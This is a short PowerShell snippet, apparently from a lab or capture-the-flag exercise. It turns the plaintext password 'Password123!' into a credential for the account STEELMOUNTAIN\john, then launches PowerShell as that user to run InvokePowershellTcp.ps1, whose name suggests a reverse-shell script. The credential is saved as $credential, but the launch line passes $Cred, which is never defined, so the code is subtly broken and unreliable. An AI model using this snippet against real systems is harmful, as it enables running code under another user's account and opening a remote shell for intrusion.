$password = convertto-securestring -AsPlainText -Force -String "Password123!";
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "STEELMOUNTAIN\john",$password;
Start-Process -FilePath c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe -Credential $Cred -ArgumentList "-file C:\Temp\InvokePowershellTcp.ps1"
